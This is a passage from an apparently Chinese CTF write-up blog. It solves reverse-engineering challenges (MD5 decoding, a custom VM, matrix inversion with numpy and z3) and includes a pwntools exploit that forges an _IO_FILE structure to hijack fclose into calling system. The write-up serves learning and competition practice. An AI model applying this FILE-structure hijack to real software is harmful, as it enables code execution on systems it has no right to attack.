  0x22, 0x11, 0x90, 0x6b, 0x93, 0x71, 0x98, 0xfd, 0x8e, 0x43, 0x79, 0xa6,
  0x21, 0x08, 0xb4, 0x49, 0x62, 0x25, 0x1e, 0xf6, 0x40, 0xb3, 0x40, 0xc0,
  0x51, 0x5a, 0x5e, 0x26, 0xaa, 0xc7, 0xb6, 0xe9, 0x5d, 0x10, 0x2f, 0xd6,
  0x53, 0x14, 0x44, 0x02, 0x81, 0xe6, 0xa1, 0xd8, 0xc8, 0xfb, 0xd3, 0xe7,
  0xe6, 0xcd, 0xe1, 0x21, 0xd6, 0x07, 0x37, 0xc3, 0x87, 0x0d, 0xd5, 0xf4,
  0xed, 0x14, 0x5a, 0x45, 0x05, 0xe9, 0xe3, 0xa9, 0xf8, 0xa3, 0xef, 0xfc,
  0xd9, 0x02, 0x6f, 0x67, 0x8a, 0x4c, 0x2a, 0x8d, 0x42, 0x39, 0xfa, 0xff,
  0x81, 0xf6, 0x71, 0x87, 0x22, 0x61, 0x9d, 0x6d, 0x0c, 0x38, 0xe5, 0xfd,
  0x44, 0xea, 0xbe, 0xa4, 0xa9, 0xcf, 0xde, 0x4b, 0x60, 0x4b, 0xbb, 0xf6,
  0x70, 0xbc, 0xbf, 0xbe, 0xc6, 0x7e, 0x9b, 0x28, 0xfa, 0x27, 0xa1, 0xea,
  0x85, 0x30, 0xef, 0xd4, 0x05, 0x1d, 0x88, 0x04, 0x39, 0xd0, 0xd4, 0xd9,
  0xe5, 0x99, 0xdb, 0xe6, 0xf8, 0x7c, 0xa2, 0x1f, 0x65, 0x56, 0xac, 0xc4,
  0x44, 0x22, 0x29, 0xf4, 0x97, 0xff, 0x2a, 0x43, 0xa7, 0x23, 0x94, 0xab,
  0x39, 0xa0, 0x93, 0xfc, 0xc3, 0x59, 0x5b, 0x65, 0x92, 0xcc, 0x0c, 0x8f,
  0x7d, 0xf4, 0xef, 0xff, 0xd1, 0x5d, 0x84, 0x85, 0x4f, 0x7e, 0xa8, 0x6f,
  0xe0, 0xe6, 0x2c, 0xfe, 0x14, 0x43, 0x01, 0xa3, 0xa1, 0x11, 0x08, 0x4e,
  0x82, 0x7e, 0x53, 0xf7, 0x35, 0xf2, 0x3a, 0xbd, 0xbb, 0xd2, 0xd7, 0x2a,
  0x91, 0xd3, 0x86, 0xeb, 0x07, 0x00, 0x00, 0x00, 0x0c, 0x00, 0x00, 0x00,
  0x11, 0x00, 0x00, 0x00, 0x16, 0x00, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00,
  0x0c, 0x00, 0x00, 0x00, 0x11, 0x00, 0x00, 0x00, 0x16, 0x00, 0x00, 0x00,
  0x07, 0x00, 0x00, 0x00, 0x0c, 0x00, 0x00, 0x00, 0x11, 0x00, 0x00, 0x00,
  0x16, 0x00, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00, 0x0c, 0x00, 0x00, 0x00,
  0x11, 0x00, 0x00, 0x00, 0x16, 0x00, 0x00, 0x00, 0x05, 0x00, 0x00, 0x00,
  0x09, 0x00, 0x00, 0x00, 0x0e, 0x00, 0x00, 0x00, 0x14, 0x00, 0x00, 0x00,
  0x05, 0x00, 0x00, 0x00, 0x09, 0x00, 0x00, 0x00, 0x0e, 0x00, 0x00, 0x00,
  0x14, 0x00, 0x00, 0x00, 0x05, 0x00, 0x00, 0x00, 0x09, 0x00, 0x00, 0x00,
  0x0e, 0x00, 0x00, 0x00, 0x14, 0x00, 0x00, 0x00, 0x05, 0x00, 0x00, 0x00,
  0x09, 0x00, 0x00, 0x00, 0x0e, 0x00, 0x00, 0x00, 0x14, 0x00, 0x00, 0x00,
  0x04, 0x00, 0x00, 0x00, 0x0b, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00,
  0x17, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x0b, 0x00, 0x00, 0x00,
  0x10, 0x00, 0x00, 0x00, 0x17, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00,
  0x0b, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x17, 0x00, 0x00, 0x00,
  0x04, 0x00, 0x00, 0x00, 0x0b, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00,
  0x17, 0x00, 0x00, 0x00, 0x06, 0x00, 0x00, 0x00, 0x0a, 0x00, 0x00, 0x00,
  0x0f, 0x00, 0x00, 0x00, 0x15, 0x00, 0x00, 0x00, 0x06, 0x00, 0x00, 0x00,
  0x0a, 0x00, 0x00, 0x00, 0x0f, 0x00, 0x00, 0x00, 0x15, 0x00, 0x00, 0x00,
  0x06, 0x00, 0x00, 0x00, 0x0a, 0x00, 0x00, 0x00, 0x0f, 0x00, 0x00, 0x00,
  0x15, 0x00, 0x00, 0x00, 0x06, 0x00, 0x00, 0x00, 0x0a, 0x00, 0x00, 0x00,
  0x0f, 0x00, 0x00, 0x00, 0x15, 0x00, 0x00, 0x00, 0x32, 0x33, 0x33, 0x33,
  0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33,
  0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33,
  0x33, 0x33, 0x33, 0x33]
s = &#39;&#39;
for c in data:
    s += chr(c)
# print s
enc = &#39;562fe3cc50014c260d9e8cf4ed38c77ac022ad0cc0075a9ab14b412a1082d5f364c286cfc623aa8d7df7c088ebf7d71883664bdee4b613b7e7a51b5213470a8db020bf598aaa2b3e03ed02c85436268a4fdac5ac807506938103e775c50099ed4fdac5ac807506938103e775c50099edc231d607b6823fd0a68e813760809754d168c21d10371a5ab61bcfe6c759ef6ef60d709ccf989d849028f97a03d2f3baa0184f8240e2fe46861dc8d15a819cb09dbec414336e741e9c73422df59de2976fb5209d8fc8bb8507245bcfa24ae11f6fb5209d8fc8bb8507245bcfa24ae11f00c77fbc60a5bfc466d3d069876ec34800c77fbc60a5bfc466d3d069876ec348df33464fb471c46abaf691c000a0e30d4fdac5ac807506938103e775c50099edf60d709ccf989d849028f97a03d2f3bafcc94a20596f2619868f3a4bf52eadf700c77fbc60a5bfc466d3d069876ec348d168c21d10371a5ab61bcfe6c759ef6e9dbec414336e741e9c73422df59de297fcc94a20596f2619868f3a4bf52eadf79b37db091979bedf00a7095851ba6f5900c77fbc60a5bfc466d3d069876ec348f60d709ccf989d849028f97a03d2f3bafcc94a20596f2619868f3a4bf52eadf7d168c21d10371a5ab61bcfe6c759ef6ef60d709ccf989d849028f97a03d2f3ba183342997ffed4b3189e977d077a60b4f404a3368d2d8f57464f739d4ed01c0e&#39;
e = []
for i in range(len(enc) / 32):
    e.append(enc[32*i:32*i+32])
print e
key = &#39;23333333333333333333333333333333&#39;[:-1]
print key
flag = &#39;&#39;
for i in range(32):
    for ch in range(256):
        x = hashlib.md5(key + chr(ch)).digest()
        x = x.encode(&#39;hex&#39;).lower()
        x = hashlib.md5(x).digest()
        x = x.encode(&#39;hex&#39;).lower()
        if x == e[i]:
            flag += chr(ch)
            break
print flag
</code></pre>
<h2 id="EASYVM"><a href="#EASYVM" class="headerlink" title="EASYVM"></a>EASYVM</h2><p>第一次做的时候手撸：</p>
<pre><code>0x05, 0x01, 0x0B,   // mov r1, rB
0x13, 0x03, 0x03,   // xor r3, r3
0x13, 0x00, 0x00,   // xor r0, r0
0x13, 0x04, 0x04,   // xor r4, r4

r1 = rB;
r3 = r0 = r4 = 0;

0x28,               // enter the loop
loop:
0x0C, 0x00, 0x33,   // add r0, 0x33
0x14, 0x00, 0x20,   // mov r0, r0 mod 0x20
0x05, 0x09, 0x01,   // mov r9, r1
0x11, 0x09, 0x00,   // add_pch r9, r0
0x0B, 0x0A, 0x09,   // ldr_ch rA, r9
0x01, 0x04, 0x0A,   // mov r4, rA
0x1B, 0x05, 0x04,   // push r5, r4
0x0C, 0x03, 0x01,   // add r3, 0x01
0x24, 0x03, 0x20,   // cmpl r3, 0x20
0x28,               // jl loop

while(1)    // loop 0x20 times
{
    r0 += 0x33;
    r0 = r0 % 0x20;
    r9 = r1;
    r9 += r0;
    rA = r9;
    r4 = rA;
    r5 = r4 + 1;
    r3 += 0x01;
    if(r3 &gt;= 0x20)
        break;
}

0x13, 0x00, 0x00,   // xor r0, r0
0x07, 0x08, 0x05,   // lea_int r8, r5
0x0E, 0x08, 0xE0,   // add r8, 0xE0
0x07, 0x02, 0x08,   // lea_int r2, r8
0x09, 0x0A, 0x02,   // ldr_int rA, r2
0x01, 0x00, 0x0A,   // mov r0, rA
0x18, 0x00, 0xE0,   // and r0, 0xE0
0x1E, 0x00, 0x05,   // shr r0, 0x05
0x01, 0x04, 0x00,   // mov r4, r0
0x13, 0x03, 0x03,   // xor r3, r3

r0 = 0;
r8 = r5;
r8 += 0xE0;
r2 = r8;
rA = r2;
r0 = rA;
r0 &amp;= 0xE0;
r0 &gt;&gt;= 0x05;
r0 &amp;= 0xFF;
r4 = r0;
r3 = 0;

0x28,               // enter the loop
loop:
0x09, 0x0A, 0x02,   // ldr_int rA, r2
0x01, 0x00, 0x0A,   // mov r0, rA
0x18, 0x00, 0x1F,   // and r0, 0x1F
0x20, 0x00, 0x03,   // shl r0, 0x03
0x1B, 0x05, 0x00,   // push r5, r0
0x07, 0x08, 0x05,   // lea_int r8, r5
0x0E, 0x08, 0xE0,   // add r8, 0xE0
0x07, 0x02, 0x08,   // lea_int r2, r8
0x09, 0x0A, 0x02,   // ldr_int rA, r2
0x01, 0x00, 0x0A,   // mov, r0, rA
0x18, 0x00, 0xE0,   // and r0, 0xE0
0x1E, 0x00, 0x05,   // shr r0, 0x05
0x1D, 0x05, 0x0A,   // pop r5, rA
0x0D, 0x0A, 0x00,   // add rA, r0
0x1B, 0x05, 0x0A,   // push r5, rA
0x0C, 0x03, 0x01,   // add r3, 0x01
0x24, 0x03, 0x1F,   // cmpl r3, 0x1F
0x28,               // jl loop

while(1)    // loop 0x1F times
{
    rA = r2;
    r0 = rA;
    r0 &amp;= 0x1F;
    r0 &lt;&lt;= 0x03;
    r0 &amp;= 0xFF;
    r5 = r0 + 1;
    r8 = r5;
    r8 += 0xE0;
    r2 = r8;
    rA = r2;
    r0 = rA;
    r0 &amp;= 0xE0;
    r0 &gt;&gt;= 0x05;
    r0 &amp;= 0xFF;
    rA = r5 - 1;
    rA += r0;
    r5 = rA + 1;
    r3 += 1;
    if(r3 &gt;= 0x1F)
        break;
}

0x09, 0x0A, 0x02,   // ldr_int rA, r2
0x01, 0x00, 0x0A,   // mov r0, rA
0x18, 0x00, 0x1F,   // and r0, 0x1F
0x20, 0x00, 0x03,   // shl r0, 0x03
0x0D, 0x00, 0x04,   // add r0, r4
0x1B, 0x05, 0x00,   // push r5, r0
0x13, 0x03, 0x03,   // xor r3, r3
0x03, 0x04, 0x0D,   // mov, r4, rD  // 0xEFBEADDE
0x28,               // enter the loop

rA = r2;
r0 = rA;
r0 &amp;= 0x1F;
r0 &lt;&lt;= 0x03;
r0 &amp;= 0xFF;
r0 += r4;
r5 = r0 + 1;
r3 = 0;
r4 = rD;

loop:
0x07, 0x08, 0x05,   // lea_int r8, r5
0x0E, 0x08, 0xE0,   // add r8, 0xE0
0x07, 0x02, 0x08,   // lea_int r2, r8
0x09, 0x0A, 0x02,   // ldr_int rA, r2
0x01, 0x00, 0x0A,   // mov, r0, rA
0x1B, 0x05, 0x00,   // push r5, r0
0x01, 0x00, 0x04,   // mov r0, r4
0x0D, 0x00, 0x03,   // and r0, r3
0x1D, 0x05, 0x0A,   // pop r5, rA
0x13, 0x0A, 0x00,   // xor rA, r0
0x1B, 0x05, 0x0A,   // push r5, rA
0x22, 0x04, 0x08,   // ror r4, 0x08
0x0C, 0x03, 0x01,   // add r3, 0x01
0x24, 0x03, 0x20,   // cmpl r3, 0x20
0x28,               // jl loop

while(1)    // loop 0x20 times
{
    r8 = r5;
    r8 += 0xE0;
    r2 = r8;
    rA = r2;
    r0 = rA;
    r5 = r0 + 1;
    r0 = r4;
    r0 += r3;
    rA = r5 - 1;
    rA ^= r0;
    r5 = rA + 1;
    r4 = (1 &lt;&lt; 8 - 1) &amp; (r4 &lt;&lt; 24) + ((1 &lt;&lt; 24 - 1) &amp; (r4 &gt;&gt; 8));
    r3 += 1;
    if(r3 &gt;= 0x20)
        break;
}

0x13, 0x03, 0x03,   // xor r3, r3
0x13, 0x04, 0x04,   // xor r4, r4
0x05, 0x01, 0x0C,   // mov r1, rC   // enc
0x28,               // enter the loop

r3 = r4 = 0;
r1 = rC;

loop:
0x05, 0x09, 0x01,   // mov r9, r1
0x11, 0x09, 0x03,   // add_pch r9, r3
0x0B, 0x0A, 0x09,   // ldr_ch rA, r9
0x01, 0x00, 0x0A,   // mov r0, rA
0x1B, 0x05, 0x00,   // push r5, r0
0x07, 0x08, 0x05,   // lea_int r8, r5
0x0E, 0x08, 0xDF,   // add r8, 0xDF
0x09, 0x0A, 0x08,   // ldr_int rA, r8
0x1D, 0x05, 0x00,   // pop r5, r0
0x1B, 0x05, 0x00,   // push r5, r0
0x27, 0x00, 0x0A,   // cmpeq r0, rA
0x17, 0x04, 0x07,   // mov r4, r4 | r7
0x0C, 0x03, 0x01,   // add r3, 0x01
0x24, 0x03, 0x20,   // cmpl r3, 0x20
0x28                // jl loop

while(1)    // loop 0x20 times
{
    r9 = r1;
    r9 += r3;
    rA = r9;
    r0 = rA;
    r5 = r0 + 1;
    r8 = r5;
    r8 += 0xDF;
    rA = r8;
    r0 = r5 - 1;
    r5 = r0 + 1;
    r0 != rA
    r4 |= r7;
    r3 += 1;
    if(r3 &gt;= 0x20)
        break;
}
</code></pre><p>其实还是挺清楚的，可以逆出来。脚本如下：</p>
<pre><code class="python"># reverse step3
enc1 = [0x75, 0x85, 0xD1, 0x39, 0x0B, 0x29, 0xCD, 0x77, 0x6D, 0x9F, 0x73, 0x23, 0x61, 0x8B, 0x4D, 0x45, 0x9D, 0x8F, 0x5B, 0x11, 0xC1, 0xC9, 0xE5, 0xCF, 0x45, 0xE5, 0xB1, 0xB3, 0x41, 0xD9, 0xCF, 0xCF]
key = [0xDE, 0xAD, 0xBE, 0xEF]
enc2 = [enc1[i] ^ ((key[i % 4] + i) &amp; 0xFF) for i in range(32)]
# reverse step2
enc3 = [0 for i in range(32)]
def f(a, b):
    return ((a &lt;&lt; 5) &amp; 0xE0 | (b &gt;&gt; 3) &amp; 0x1F)
for i in range(1, 32):
    enc3[i] = f(enc2[i - 1], enc2[i])
enc3[0] = f(enc2[31], enc2[0])
# reverse step1
enc4 = [0 for i in range(32)]
j = 0
for i in range(32):
    j += 0x33
    enc4[j % 0x20] = enc3[i]
flag = &#39;&#39;
for ch in enc4:
    flag += chr(ch)
print flag
</code></pre>
<h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="Challenge1"><a href="#Challenge1" class="headerlink" title="Challenge1"></a>Challenge1</h2><p>利用了 <code>_IO_FILE</code> 的相关漏洞，和之前一道练习题很类似：</p>
<pre><code class="cpp">__int64 __fastcall main(__int64 a1, char **a2, char **a3)
{
  int c; // [rsp+Ch] [rbp-4h]

  stream = fopen(&quot;test.txt&quot;, &quot;r&quot;);
  init_func();
  while ( 1 )
  {
    while ( 1 )
    {
      putchar(&#39;&gt;&#39;);
      c = readline();
      if ( c != 1 )
        break;
      get_s();
    }
    if ( c != 2 )
      break;
    put_s();
  }
  if ( c == 3 )
    close_stream();
  return 0LL;
}
</code></pre>
<p>输入的 s 可以覆盖掉 stream 指针，偏移是 0x100。</p>
<pre><code class="ida">.bss:00000000006010C0 s               db 100h dup(?)          ; DATA XREF: get_s+4↑o
.bss:00000000006010C0                                         ; put_s+4↑o
.bss:00000000006011C0 ; FILE *stream
.bss:00000000006011C0 stream          dq ?                    ; DATA XREF: close_stream+4↑r
</code></pre>
<p>关于 <code>_IO_FILE</code> 一些 symbol 在 gdb 里可以看：</p>
<pre><code class="gdb">assassinq&gt;&gt; p sizeof(FILE)
$1 = 0xd8
assassinq&gt;&gt; p sizeof(struct _IO_FILE_plus)
$2 = 0xe0
assassinq&gt;&gt; p *(struct _IO_FILE_plus *)stdin
$3 = {
  file = {
    _flags = 0xfbad208b,
    _IO_read_ptr = 0x7ffff7dcfa84 &lt;_IO_2_1_stdin_+132&gt; &quot;&quot;,
    _IO_read_end = 0x7ffff7dcfa84 &lt;_IO_2_1_stdin_+132&gt; &quot;&quot;,
    _IO_read_base = 0x7ffff7dcfa83 &lt;_IO_2_1_stdin_+131&gt; &quot;\n&quot;,
    _IO_write_base = 0x7ffff7dcfa83 &lt;_IO_2_1_stdin_+131&gt; &quot;\n&quot;,
    _IO_write_ptr = 0x7ffff7dcfa83 &lt;_IO_2_1_stdin_+131&gt; &quot;\n&quot;,
    _IO_write_end = 0x7ffff7dcfa83 &lt;_IO_2_1_stdin_+131&gt; &quot;\n&quot;,
    _IO_buf_base = 0x7ffff7dcfa83 &lt;_IO_2_1_stdin_+131&gt; &quot;\n&quot;,
    _IO_buf_end = 0x7ffff7dcfa84 &lt;_IO_2_1_stdin_+132&gt; &quot;&quot;,
    _IO_save_base = 0x0,
    _IO_backup_base = 0x0,
    _IO_save_end = 0x0,
    _markers = 0x0,
    _chain = 0x0,
    _fileno = 0x0,
    _flags2 = 0x0,
    _old_offset = 0xffffffffffffffff,
    _cur_column = 0x0,
    _vtable_offset = 0x0,
    _shortbuf = &quot;\n&quot;,
    _lock = 0x7ffff7dd18d0 &lt;_IO_stdfile_0_lock&gt;,
    _offset = 0xffffffffffffffff,
    _codecvt = 0x0,
    _wide_data = 0x7ffff7dcfae0 &lt;_IO_wide_data_0&gt;,
    _freeres_list = 0x0,
    _freeres_buf = 0x0,
    __pad5 = 0x0,
    _mode = 0xffffffff,
    _unused2 = &#39;\000&#39; &lt;repeats 19 times&gt;
  },
  vtable = 0x7ffff7dcc2a0 &lt;_IO_file_jumps&gt;
}
assassinq&gt;&gt; p *((struct _IO_FILE_plus *)stdin).vtable
$4 = {
  __dummy = 0x0,
  __dummy2 = 0x0,
  __finish = 0x7ffff7a70330 &lt;_IO_new_file_finish&gt;,
  __overflow = 0x7ffff7a71300 &lt;_IO_new_file_overflow&gt;,
  __underflow = 0x7ffff7a71020 &lt;_IO_new_file_underflow&gt;,
  __uflow = 0x7ffff7a723c0 &lt;__GI__IO_default_uflow&gt;,
  __pbackfail = 0x7ffff7a73c50 &lt;__GI__IO_default_pbackfail&gt;,
  __xsputn = 0x7ffff7a6f930 &lt;_IO_new_file_xsputn&gt;,
  __xsgetn = 0x7ffff7a6f590 &lt;__GI__IO_file_xsgetn&gt;,
  __seekoff = 0x7ffff7a6eb90 &lt;_IO_new_file_seekoff&gt;,
  __seekpos = 0x7ffff7a72990 &lt;_IO_default_seekpos&gt;,
  __setbuf = 0x7ffff7a6e850 &lt;_IO_new_file_setbuf&gt;,
  __sync = 0x7ffff7a6e6d0 &lt;_IO_new_file_sync&gt;,
  __doallocate = 0x7ffff7a62100 &lt;__GI__IO_file_doallocate&gt;,
  __read = 0x7ffff7a6f910 &lt;__GI__IO_file_read&gt;,
  __write = 0x7ffff7a6f190 &lt;_IO_new_file_write&gt;,
  __seek = 0x7ffff7a6e910 &lt;__GI__IO_file_seek&gt;,
  __close = 0x7ffff7a6e840 &lt;__GI__IO_file_close&gt;,
  __stat = 0x7ffff7a6f180 &lt;__GI__IO_file_stat&gt;,
  __showmanyc = 0x7ffff7a73dd0 &lt;_IO_default_showmanyc&gt;,
  __imbue = 0x7ffff7a73de0 &lt;_IO_default_imbue&gt;
}
</code></pre>
<p>想法是把 stream 覆盖成 bss 上构造的部分，fclose 就会触发 system，Exploit：</p>
<pre><code class="python">#!/usr/bin/env python
from pwn import *
binary = &#39;./task_challenge1&#39;
elf = ELF(binary)
context.log_level = &#39;debug&#39;
context.arch = elf.arch
context.terminal = [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;]
local = 1
if local:
    p = process(binary)
else:
    p = remote(&#39;202.112.51.184&#39;, 30003)
ub_offset = 0x3c4b30
p.sendlineafter(&#39;&gt;&#39;, &#39;1&#39;)
gdb.attach(p)
buf_addr = 0x6010C0
system = 0x400897
payload = (
    (((&#39;\0&#39; * 0x10 + p64(system) + &#39;\0&#39; * 70).ljust(0x88,&#39;\0&#39;) + p64(buf_addr)).ljust(0xd8, &#39;\0&#39;) + p64(buf_addr)).ljust(0x100, &#39;\0&#39;) +
    p64(buf_addr)
)
p.sendline(payload)
p.sendlineafter(&#39;&gt;&#39;, &#39;3&#39;)
p.interactive()
</code></pre>
<h1 id="MOBILE"><a href="#MOBILE" class="headerlink" title="MOBILE"></a>MOBILE</h1><h2 id="SWAG"><a href="#SWAG" class="headerlink" title="SWAG"></a>SWAG</h2><p>拖进 jadx，直接看 Mainactivity 中的函数，可以知道对输入数据进行了长度的判断和内容的正则判断。然后还存在 native 层，需要对 so 文件分析。</p>
<p>在 ida 里能看出经过两次加密过程，仔细发现其实是矩阵的一些操作，先对矩阵转置：</p>
<pre><code class="cpp">char **__fastcall matrix_transpos(char **matrix)
{
  char *v1; // x8
  char *v2; // x11
  char *v3; // x8
  char *v4; // x8
  char *v5; // x8
  char *v6; // x8
  char *v7; // x8
  char *v8; // x9
  char *v9; // x8
  char *v10; // x9
  char *v11; // x8
  char *v12; // x9
  char *v13; // x8
  char *v14; // x9
  char *v15; // x8
  char *v16; // x9
  char *v17; // x8
  char *v18; // x9
  char *v19; // x8
  char *v20; // x9
  char *v21; // x8
  char *v22; // x9
  char *v23; // x8
  char *v24; // x9
  char *v25; // x8
  char *v26; // x9

  v1 = matrix[1];
  LODWORD(v2) = *((_DWORD *)*matrix + 1);
  *((_DWORD *)*matrix + 1) = *(_DWORD *)v1;
  *(_DWORD *)v1 = (_DWORD)v2;
  v3 = matrix[2];
  LODWORD(v2) = *((_DWORD *)*matrix + 2);
  *((_DWORD *)*matrix + 2) = *(_DWORD *)v3;
  *(_DWORD *)v3 = (_DWORD)v2;
  v4 = matrix[3];
  LODWORD(v2) = *((_DWORD *)*matrix + 3);
  *((_DWORD *)*matrix + 3) = *(_DWORD *)v4;
  *(_DWORD *)v4 = (_DWORD)v2;
  v5 = matrix[4];
  LODWORD(v2) = *((_DWORD *)*matrix + 4);
  *((_DWORD *)*matrix + 4) = *(_DWORD *)v5;
  *(_DWORD *)v5 = (_DWORD)v2;
  v6 = matrix[5];
  LODWORD(v2) = *((_DWORD *)*matrix + 5);
  *((_DWORD *)*matrix + 5) = *(_DWORD *)v6;
  *(_DWORD *)v6 = (_DWORD)v2;
  v8 = matrix[1];
  v7 = matrix[2];
  LODWORD(v2) = *((_DWORD *)v8 + 2);
  *((_DWORD *)v8 + 2) = *((_DWORD *)v7 + 1);
  *((_DWORD *)v7 + 1) = (_DWORD)v2;
  v9 = matrix[3];
  v10 = matrix[1];
  LODWORD(v2) = *((_DWORD *)v10 + 3);
  *((_DWORD *)v10 + 3) = *((_DWORD *)v9 + 1);
  *((_DWORD *)v9 + 1) = (_DWORD)v2;
  v11 = matrix[4];
  v12 = matrix[1];
  LODWORD(v2) = *((_DWORD *)v12 + 4);
  *((_DWORD *)v12 + 4) = *((_DWORD *)v11 + 1);
  *((_DWORD *)v11 + 1) = (_DWORD)v2;
  v13 = matrix[5];
  v14 = matrix[1];
  LODWORD(v2) = *((_DWORD *)v14 + 5);
  *((_DWORD *)v14 + 5) = *((_DWORD *)v13 + 1);
  *((_DWORD *)v13 + 1) = (_DWORD)v2;
  v16 = matrix[2];
  v15 = matrix[3];
  LODWORD(v2) = *((_DWORD *)v16 + 3);
  *((_DWORD *)v16 + 3) = *((_DWORD *)v15 + 2);
  *((_DWORD *)v15 + 2) = (_DWORD)v2;
  v17 = matrix[4];
  v18 = matrix[2];
  LODWORD(v2) = *((_DWORD *)v18 + 4);
  *((_DWORD *)v18 + 4) = *((_DWORD *)v17 + 2);
  *((_DWORD *)v17 + 2) = (_DWORD)v2;
  v19 = matrix[5];
  v20 = matrix[2];
  LODWORD(v2) = *((_DWORD *)v20 + 5);
  *((_DWORD *)v20 + 5) = *((_DWORD *)v19 + 2);
  *((_DWORD *)v19 + 2) = (_DWORD)v2;
  v22 = matrix[3];
  v21 = matrix[4];
  LODWORD(v2) = *((_DWORD *)v22 + 4);
  *((_DWORD *)v22 + 4) = *((_DWORD *)v21 + 3);
  *((_DWORD *)v21 + 3) = (_DWORD)v2;
  v23 = matrix[5];
  v24 = matrix[3];
  LODWORD(v2) = *((_DWORD *)v24 + 5);
  *((_DWORD *)v24 + 5) = *((_DWORD *)v23 + 3);
  *((_DWORD *)v23 + 3) = (_DWORD)v2;
  v26 = matrix[4];
  v25 = matrix[5];
  LODWORD(v2) = *((_DWORD *)v26 + 5);
  *((_DWORD *)v26 + 5) = *((_DWORD *)v25 + 4);
  *((_DWORD *)v25 + 4) = (_DWORD)v2;
  return matrix;
}
</code></pre>
<p>再将两个矩阵相乘：</p>
<pre><code class="cpp">char *__fastcall matrix_inverse(char *matrix, char *data)
{
  char *v2; // x19
  char *v3; // x22
  char *v4; // x20
  char *v5; // x21
  char *v6; // x0
  __int64 i; // x8
  char *v8; // x9
  char *v9; // x10
  __int64 j; // x11

  v2 = matrix;
  v3 = data;
  v4 = (char *)malloc(48LL);
  v5 = (char *)malloc(24LL);
  *(_QWORD *)v4 = v5;
  *((_QWORD *)v4 + 1) = malloc(24LL);
  *((_QWORD *)v4 + 2) = malloc(24LL);
  *((_QWORD *)v4 + 3) = malloc(24LL);
  *((_QWORD *)v4 + 4) = malloc(24LL);
  v6 = (char *)malloc(24LL);
  i = 0LL;
  *((_QWORD *)v4 + 5) = v6;
  while ( 1 )
  {
    v9 = *(char **)&amp;v2[8 * i];
    j = 0LL;
    do
    {
      v8 = v3 + 72;
      *(_DWORD *)&amp;v5[j] = *(_DWORD *)&amp;v8[j - 72] * *(_DWORD *)v9
                        + *(_DWORD *)&amp;v8[j - 48] * *((_DWORD *)v9 + 1)
                        + *(_DWORD *)&amp;v8[j - 24] * *((_DWORD *)v9 + 2)
                        + *(_DWORD *)&amp;v8[j] * *((_DWORD *)v9 + 3)
                        + *(_DWORD *)&amp;v8[j + 24] * *((_DWORD *)v9 + 4)
                        + *(_DWORD *)&amp;v8[j + 48] * *((_DWORD *)v9 + 5);
      j += 4LL;
    }
    while ( j != 24 );
    if ( ++i == 6 )
      break;
    v5 = *(char **)&amp;v4[8 * i];
  }
  return v4;
}
</code></pre>
<p>那么这个过程用 numpy 就能解出来，解题脚本：</p>
<pre><code class="python">from numpy import *
enc = [
    0x0004E36B, 0x000362D6, 0x0003D5F1, 0x00063C4C, 0x00066AF7, 0x000418B7,
    0x0004BE2E, 0x00035571, 0x0003DA7F, 0x00060D4A, 0x0006423A, 0x0003FC18,
    0x0003A3B6, 0x0002FBEE, 0x00038F5B, 0x000509E4, 0x00057DAE, 0x00037D25,
    0x0002E69A, 0x00028B2A, 0x000363B1, 0x00041DAE, 0x00049FA8, 0x0002D536,
    0x0003B440, 0x00028D5B, 0x0003AF48, 0x00051F80, 0x00059294, 0x00030E5F,
    0x00047CF0, 0x00034F47, 0x00033520, 0x000547A8, 0x000581E0, 0x0003E875
]
data = [
    0x00000106, 0x00000245, 0x0000009C, 0x000001E2, 0x00000224, 0x0000027A,
    0x00000112, 0x000000AE, 0x00000323, 0x000003C4, 0x00000370, 0x000000DC,
    0x00000387, 0x0000001E, 0x000000B6, 0x000003D8, 0x0000035D, 0x0000013A,
    0x000002B9, 0x00000162, 0x00000083, 0x00000225, 0x00000057, 0x0000018C,
    0x00000109, 0x0000021B, 0x00000319, 0x000000EE, 0x000002C1, 0x000001D5,
    0x0000023A, 0x0000019A, 0x00000145, 0x0000025E, 0x0000032A, 0x000001D6
]
trans_data = mat(data).reshape(6, 6)
trans_enc = mat(enc).reshape(6, 6)
trans = trans_enc * trans_data.I
res = trans.T.reshape(1, 36).tolist()[0]
flag = &#39;&#39;
for ch in res:
    flag += chr(int(round(ch)))
print(flag)
</code></pre>
<p>因为还没学过线代，还没看懂的时候，硬生生现学现用 z3 把矩阵求逆的过程解出来了，所以顺便贴一波现学的 z3 脚本：</p>
<pre><code class="python">from z3 import *
enc = [0x0004E36B, 0x000362D6, 0x0003D5F1, 0x00063C4C, 0x00066AF7, 0x000418B7, 0x0004BE2E, 0x00035571, 0x0003DA7F, 0x00060D4A, 0x0006423A, 0x0003FC18, 0x0003A3B6, 0x0002FBEE, 0x00038F5B, 0x000509E4, 0x00057DAE, 0x00037D25, 0x0002E69A, 0x00028B2A, 0x000363B1, 0x00041DAE, 0x00049FA8, 0x0002D536, 0x0003B440, 0x00028D5B, 0x0003AF48, 0x00051F80, 0x00059294, 0x00030E5F, 0x00047CF0, 0x00034F47, 0x00033520, 0x000547A8, 0x000581E0, 0x0003E875]
data = [0x00000106, 0x00000245, 0x0000009C, 0x000001E2, 0x00000224, 0x0000027A, 0x00000112, 0x000000AE, 0x00000323, 0x000003C4, 0x00000370, 0x000000DC, 0x00000387, 0x0000001E, 0x000000B6, 0x000003D8, 0x0000035D, 0x0000013A, 0x000002B9, 0x00000162, 0x00000083, 0x00000225, 0x00000057, 0x0000018C, 0x00000109, 0x0000021B, 0x00000319, 0x000000EE, 0x000002C1, 0x000001D5, 0x0000023A, 0x0000019A, 0x00000145, 0x0000025E, 0x0000032A, 0x000001D6]
i = 0
res = &#39;&#39;
while(1):
    s = Solver()
    n0 = Int(&#39;n0&#39;)
    n1 = Int(&#39;n1&#39;)
    n2 = Int(&#39;n2&#39;)
    n3 = Int(&#39;n3&#39;)
    n4 = Int(&#39;n4&#39;)
    n5 = Int(&#39;n5&#39;)
